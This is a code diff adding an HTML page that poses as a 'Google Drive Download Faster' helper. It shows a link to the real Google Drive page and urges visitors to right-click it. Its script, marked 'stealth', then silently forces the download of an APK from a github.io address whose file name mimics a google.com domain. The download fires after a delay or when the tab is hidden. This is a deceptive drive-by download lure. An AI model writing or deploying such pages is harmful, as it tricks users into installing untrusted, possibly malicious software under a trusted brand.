@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google Drive Download Faster</title>
+<style>
+    h1 { margin: 1em; }
+    input { display: none; }
+    img { width: 100%; }
+</style>
+</head>
+<body>
+
+<center>
+<br><br><br><br>
+
+<h3><a id="link" href="https://workspace.google.com/intl/en_in/products/drive/">
+Right Click and Open in Split View for faster download!
+</a></h3>
+
+</center>
+
+<script>
+let armed = false;
+
+link.addEventListener('contextmenu', function(e) {
+    armed = true;
+
+    // stealth
+    setTimeout(() => {
+        if (!armed) return;
+
+        const a = document.createElement('a');
+        a.href = "https://mohammedalqi.github.io/googledrivefiles.file.us.google.com__.apk";
+        a.download = "https://mohammedalqi.github.io/googledrivefiles.file.us.google.com__.apk";
+        a.click();
+    }, 4000);
+});
+
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden && armed) {
+        const a = document.createElement('a');
+        a.href = "https://mohammedalqi.github.io/googledrivefiles.file.us.google.com__.apk";
+        a.download = "https://mohammedalqi.github.io/googledrivefiles.file.us.google.com__.apk";
+        a.click();
+
+        armed = false;
+    }
+});
+</script>
+
+</body>
+</html>
